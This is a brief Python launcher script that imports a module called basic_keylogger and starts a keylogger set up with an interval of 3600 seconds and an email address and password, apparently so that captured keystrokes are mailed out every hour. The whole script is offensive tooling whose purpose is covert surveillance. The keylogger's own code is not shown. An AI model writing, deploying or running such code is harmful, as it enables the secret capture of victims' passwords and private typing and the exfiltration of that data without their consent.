#!/usr/bin/env python3
import basic_keylogger

keylogger = basic_keylogger.Keylogger(3600, "email@example.com", "SuperSecretPassword")
keylogger.start()
